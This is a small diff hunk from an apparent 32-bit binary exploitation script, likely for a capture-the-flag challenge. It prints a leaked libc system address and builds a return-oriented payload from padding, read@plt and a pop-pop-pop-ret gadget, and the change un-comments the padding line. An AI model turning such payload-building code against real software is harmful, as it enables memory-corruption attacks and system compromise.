@@ -47,7 +47,7 @@ print(hex(libc_sys))
 input("stop")
 
 pay = b""
-# pay += b"XXXX"
+pay += b"XXXX"
 pay += p32(read_plt)
 pay += p32(pppr)
 pay += p32(0)
